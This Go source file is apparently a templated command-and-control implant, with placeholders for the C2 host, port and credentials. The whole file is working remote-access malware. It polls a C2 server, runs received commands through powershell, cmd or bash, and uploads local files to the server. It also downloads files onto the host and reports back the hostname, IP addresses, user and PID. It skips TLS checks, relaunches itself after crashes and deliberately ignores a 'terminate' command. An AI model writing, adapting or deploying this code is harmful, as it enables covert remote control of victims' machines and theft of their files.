package main

import (
    "bytes"
    "crypto/tls"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "io/ioutil"
    "mime/multipart"
    "net"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "path/filepath"
    "runtime"
    "strings"
    "strconv"
    "time"
    "context"
)

const (
    C2_URL     = "https://{lhost}:{lport}"
    CLIENT_ID  = "{line}"
    USERNAME   = "{username}"
    PASSWORD   = "{password}"
    SLEEP      = {sleep}
    MALEABLE   = "{maleable}"
    USER_AGENT = "{useragent}"
    MAX_RETRIES = 5
    RETRY_DELAY = 5 * time.Second
)


func globalRecover() {
    if r := recover(); r != nil {
        fmt.Printf("[RECOVER] Recuperándose de panic: %v\n", r)
        
        executable, err := os.Executable()
        if err == nil {
            exec.Command(executable).Start()
        }
    }
}


func sendRequestWithRetry(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
    var lastErr error
    for attempt := 0; attempt < MAX_RETRIES; attempt++ {
        if attempt > 0 {
            time.Sleep(RETRY_DELAY)
        }

        resp, err := sendRequest(ctx, url, method, body, filePath)
        if err == nil {
            return resp, nil
        }
        lastErr = err
        fmt.Printf("[RETRY] Intento %d de %d fallido: %v\n", attempt+1, MAX_RETRIES, err)
    }
    return nil, lastErr
}

func sendRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
    defer globalRecover()

    
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{
        Timeout:   60 * time.Second,
        Transport: tr,
    }

    var req *http.Request
    var err error

    if filePath != "" {
        file, err := os.Open(filePath)
        if err != nil {
            return nil, fmt.Errorf("error abriendo archivo: %w", err)
        }
        defer file.Close()

        bodyBuffer := &bytes.Buffer{}
        writer := multipart.NewWriter(bodyBuffer)
        part, err := writer.CreateFormFile("file", filepath.Base(filePath))
        if err != nil {
            return nil, fmt.Errorf("error creando form file: %w", err)
        }

        _, err = io.Copy(part, file)
        if err != nil {
            return nil, fmt.Errorf("error copiando archivo: %w", err)
        }
        writer.Close()

        req, err = http.NewRequestWithContext(ctx, method, url, bodyBuffer)
        if err != nil {
            return nil, fmt.Errorf("error creando request: %w", err)
        }
        req.Header.Set("Content-Type", writer.FormDataContentType())
    } else {
        req, err = http.NewRequestWithContext(ctx, method, url, strings.NewReader(body))
        if err != nil {
            return nil, fmt.Errorf("error creando request: %w", err)
        }
        if method == "POST" {
            req.Header.Set("Content-Type", "application/json")
        }
    }

    req.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(USERNAME+":"+PASSWORD)))
    req.Header.Set("User-Agent", USER_AGENT)

    return client.Do(req)
}

func executeCommandWithRetry(shellCommand []string, command string) (string, error) {
    var output string
    var lastErr error

    for attempt := 0; attempt < MAX_RETRIES; attempt++ {
        if attempt > 0 {
            time.Sleep(RETRY_DELAY)
        }

        output, lastErr = executeCommand(shellCommand, command)
        if lastErr == nil {
            return output, nil
        }
        fmt.Printf("[RETRY] Intento de ejecución %d de %d fallido: %v\n", attempt+1, MAX_RETRIES, lastErr)
    }
    return "", lastErr
}

func executeCommand(shellCommand []string, command string) (string, error) {
    defer globalRecover()

    ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
    defer cancel()

    cmd := exec.CommandContext(ctx, shellCommand[0], shellCommand[1], command)
    var out bytes.Buffer
    cmd.Stdout = &out
    cmd.Stderr = &out

    err := cmd.Run()
    if err != nil {
        return out.String(), fmt.Errorf("error en ejecución: %w\n%s", err, out.String())
    }

    return out.String(), nil
}

func getShellCommand() []string {
    defer globalRecover()

    osName := runtime.GOOS
    switch osName {
    case "windows":
        if _, err := exec.LookPath("powershell"); err == nil {
            return []string{"powershell", "-Command"}
        }
        return []string{"cmd", "/C"}
    case "linux", "darwin":
        if _, err := exec.LookPath("bash"); err == nil {
            return []string{"bash", "-c"}
        }
        return []string{"sh", "-c"}
    default:
        
        return []string{"sh", "-c"}
    }
}

func main() {
    defer globalRecover()

    baseCtx := context.Background()
    shellCommand := getShellCommand()

    for {
        func() {
            defer globalRecover()

            ctx, cancel := context.WithTimeout(baseCtx, 180*time.Second)
            defer cancel()

            resp, err := sendRequestWithRetry(ctx, C2_URL+MALEABLE+CLIENT_ID, "GET", "", "")
            if err != nil {
                fmt.Printf("[ERROR] Error en request principal: %v\n", err)
                time.Sleep(SLEEP * time.Second)
                return
            }

            if resp == nil || resp.Body == nil {
                fmt.Println("[ERROR] Respuesta vacía")
                time.Sleep(SLEEP * time.Second)
                return
            }

            defer resp.Body.Close()
            body, err := ioutil.ReadAll(resp.Body)
            if err != nil {
                fmt.Printf("[ERROR] Error leyendo respuesta: %v\n", err)
                time.Sleep(SLEEP * time.Second)
                return
            }

            command := string(body)

            
            func() {
                defer globalRecover()

                switch {
                case strings.Contains(command, "terminate"):
                    
                    fmt.Println("[INFO] Comando terminate recibido pero continuando operación")

                case strings.HasPrefix(command, "download:"):
                    handleDownload(ctx, command)

                case strings.HasPrefix(command, "upload:"):
                    handleUpload(ctx, command)

                default:
                    handleCommand(ctx, command, shellCommand)
                }
            }()
        }()

        time.Sleep(SLEEP * time.Second)
    }
}

func handleDownload(ctx context.Context, command string) {
    defer globalRecover()

    filePath := strings.TrimPrefix(command, "download:")
    fileURL := C2_URL + MALEABLE + "download/" + filePath

    resp, err := sendRequestWithRetry(ctx, fileURL, "GET", "", "")
    if err != nil {
        fmt.Printf("[ERROR] Error en descarga: %v\n", err)
        return
    }

    if resp == nil || resp.Body == nil {
        fmt.Println("[ERROR] Respuesta de descarga vacía")
        return
    }

    defer resp.Body.Close()
    fileData, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        fmt.Printf("[ERROR] Error leyendo archivo: %v\n", err)
        return
    }

    err = ioutil.WriteFile(filepath.Base(filePath), fileData, 0644)
    if err != nil {
        fmt.Printf("[ERROR] Error escribiendo archivo: %v\n", err)
        return
    }

    fmt.Printf("[INFO] Archivo descargado: %s\n", filePath)
}

func handleUpload(ctx context.Context, command string) {
    defer globalRecover()

    filePath := strings.TrimPrefix(command, "upload:")
    resp, err := sendRequestWithRetry(ctx, C2_URL+MALEABLE+"upload", "POST", "", filePath)
    if err != nil {
        fmt.Printf("[ERROR] Error en upload: %v\n", err)
        return
    }

    if resp != nil {
        defer resp.Body.Close()
        if resp.StatusCode == http.StatusOK {
            fmt.Printf("[INFO] Archivo subido: %s\n", filePath)
        } else {
            fmt.Printf("[ERROR] Fallo en subida: %s (Status: %d)\n", filePath, resp.StatusCode)
        }
    }
}

func handleCommand(ctx context.Context, command string, shellCommand []string) {
    defer globalRecover()
    pid := os.Getpid()
    hostname, err := os.Hostname()
    if err != nil {
        fmt.Println("[ERROR] Error geting hostname:", err)
        hostname = "unknown"
    }
    var ips []string
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        fmt.Println("[ERROR] Error getting IP:", err)
    } else {
        for _, addr := range addrs {
            if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
                if ipnet.IP.To4() != nil {
                    ips = append(ips, ipnet.IP.String())
                }
            }
        }
    }
    currentUser, err := user.Current()
    if err != nil {
        fmt.Println("[ERROR] Error getting user:", err)
        currentUser = &user.User{Username: "unknown"}
    }
    output, err := executeCommandWithRetry(shellCommand, command)
    if err != nil {
        fmt.Printf("[ERROR] Error ejecutando comando: %v\n", err)
        return
    }
    ipString := strings.Join(ips, ", ")
    jsonData, err := json.Marshal(map[string]string{
        "output":  output,
        "client":  runtime.GOOS,
        "command": command,
        "pid":     strconv.Itoa(pid),
        "hostname": hostname,
        "ips":     ipString,
        "user":    currentUser.Username,
    })
    if err != nil {
        fmt.Printf("[ERROR] Error en marshaling JSON: %v\n", err)
        return
    }

    resp, err := sendRequestWithRetry(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", string(jsonData), "")
    if err != nil {
        fmt.Printf("[ERROR] Error enviando resultado: %v\n", err)
        return
    }

    if resp != nil && resp.Body != nil {
        resp.Body.Close()
    }
}
